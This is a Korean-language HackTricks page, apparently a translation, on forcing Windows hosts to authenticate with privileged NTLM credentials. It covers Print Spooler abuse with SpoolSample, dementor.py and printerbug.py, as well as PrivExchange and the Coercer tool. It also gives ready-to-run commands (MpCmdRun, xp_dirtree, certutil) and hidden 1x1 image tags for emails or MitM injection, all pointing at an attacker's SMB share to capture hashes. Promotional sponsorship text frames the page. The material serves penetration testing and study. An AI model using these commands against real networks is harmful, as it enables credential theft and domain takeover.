# NTLM 특권 인증 강제

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

* **사이버 보안 회사**에서 일하시나요? **회사를 HackTricks에서 광고**하거나 **PEASS의 최신 버전에 액세스**하거나 HackTricks를 **PDF로 다운로드**하고 싶으신가요? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인해보세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 저를 **팔로우**하세요 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **[hacktricks repo](https://github.com/carlospolop/hacktricks)와 [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers)는 3rd party 종속성을 피하기 위해 C#과 MIDL 컴파일러를 사용하여 작성된 **원격 인증 트리거**의 **모음**입니다.

## Spooler Service 남용

_**Print Spooler**_ 서비스가 **활성화**되어 있다면, 이미 알려진 AD 자격 증명을 사용하여 도메인 컨트롤러의 프린트 서버에게 새로운 프린트 작업에 대한 업데이트를 요청하고, 그 작업을 **일부 시스템에게 알릴 수 있습니다**.\
프린터가 임의의 시스템에 알림을 보낼 때, 해당 **시스템에 대해 인증**해야 합니다. 따라서 공격자는 _**Print Spooler**_ 서비스를 임의의 시스템에 대해 인증하도록 만들 수 있으며, 이 인증에서 서비스는 **컴퓨터 계정**을 사용할 것입니다.

### 도메인에서 Windows 서버 찾기

PowerShell을 사용하여 Windows 상자 목록을 가져옵니다. 서버는 일반적으로 우선순위가 있으므로 여기에 초점을 맞춥니다:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Spooler 서비스 수신 확인

@mysmartlogin (Vincent Le Toux)의 [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket)를 약간 수정하여 Spooler 서비스가 수신 중인지 확인합니다:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
당신은 Linux에서 rpcdump.py를 사용하여 MS-RPRN 프로토콜을 찾을 수도 있습니다.
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### 임의의 호스트에 대해 서비스에 인증을 요청하기

[여기에서 SpoolSample을 컴파일할 수 있습니다](https://github.com/NotMedic/NetNTLMtoSilverTicket).
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
또는 Linux를 사용하는 경우 [**3xocyte의 dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) 또는 [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)를 사용할 수 있습니다.
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Unconstrained Delegation과 결합하기

만약 공격자가 이미 [Unconstrained Delegation](unconstrained-delegation.md)을 통해 컴퓨터를 침투했다면, 공격자는 **프린터가 이 컴퓨터에 대해 인증하도록 만들 수 있습니다**. Unconstrained Delegation으로 인해, **프린터의 컴퓨터 계정의 TGT**가 Unconstrained Delegation을 가진 컴퓨터의 **메모리에 저장**됩니다. 공격자는 이미 이 호스트를 침투했으므로, 이 티켓을 **검색**하고 ([Pass the Ticket](pass-the-ticket.md)) 악용할 수 있습니다.

## RCP 강제 인증

{% embed url="https://github.com/p0dalirius/Coercer" %}

## PrivExchange

`PrivExchange` 공격은 **Exchange Server의 `PushSubscription` 기능**에서 발견된 결함으로 인해 발생합니다. 이 기능은 Exchange 서버가 메일박스를 가진 모든 도메인 사용자에 의해 클라이언트가 제공한 호스트에 대해 HTTP를 통해 강제로 인증되도록 합니다.

기본적으로 **Exchange 서비스는 SYSTEM으로 실행**되며 과도한 권한을 부여받습니다 (특히, **2019년 이전 누적 업데이트에서는 도메인에 대한 WriteDacl 권한**을 가집니다). 이 결함은 **LDAP로 정보 중계 및 도메인 NTDS 데이터베이스 추출**을 가능하게 악용할 수 있습니다. LDAP로 중계하는 것이 불가능한 경우에도, 이 결함은 여전히 도메인 내의 다른 호스트로 중계 및 인증하는 데 사용될 수 있습니다. 이 공격의 성공적인 악용은 인증된 도메인 사용자 계정으로 즉시 도메인 관리자에 대한 액세스를 부여합니다.

## Windows 내부

이미 Windows 기기 내부에 있는 경우 다음과 같이 Windows를 강제로 특권 계정을 사용하여 서버에 연결할 수 있습니다:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL

MSSQL은 Microsoft SQL Server의 약어로, 관계형 데이터베이스 관리 시스템(RDBMS)입니다. 이 데이터베이스는 Windows 운영 체제에서 실행되며, 기업 환경에서 많이 사용됩니다. MSSQL은 데이터 저장, 검색, 관리, 보안 등 다양한 기능을 제공합니다. 이 데이터베이스는 웹 애플리케이션, 엔터프라이즈 솔루션, 비즈니스 인텔리전스 등 다양한 애플리케이션에서 사용됩니다.
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
또 다른 기술을 사용할 수도 있습니다: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

certutil.exe lolbin (Microsoft-signed binary)을 사용하여 NTLM 인증을 강제로 유도할 수 있습니다:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML 삽입

### 이메일을 통한 삽입

취약한 기기에 로그인하는 사용자의 **이메일 주소**를 알고 있다면, 그 사용자에게 1x1 이미지가 포함된 **이메일을 보내기만** 하면 됩니다.
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
그리고 그가 열면, 그는 인증을 시도할 것입니다.

### MitM

만약 컴퓨터에 MitM 공격을 수행하고 그가 시각화할 수 있는 페이지에 HTML을 주입할 수 있다면, 다음과 같은 이미지를 페이지에 주입해 볼 수 있습니다:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## NTLMv1 크랙하기

[NTLMv1 도전 과제를 캡처하면 여기에서 어떻게 크랙하는지 알 수 있습니다](../ntlm/#ntlmv1-attack).\
_NTLMv1을 크랙하려면 Responder 도전 과제를 "1122334455667788"로 설정해야 합니다._

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

* **사이버 보안 회사**에서 일하시나요? **회사를 HackTricks에서 광고하고 싶으신가요**? 아니면 **PEASS의 최신 버전에 액세스하거나 HackTricks를 PDF로 다운로드**하고 싶으신가요? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인해보세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 저를 **팔로우**하세요 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **[hacktricks repo](https://github.com/carlospolop/hacktricks)와 [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**에 PR을 제출하여 여러분의 해킹 기법을 공유해주세요.

</details>
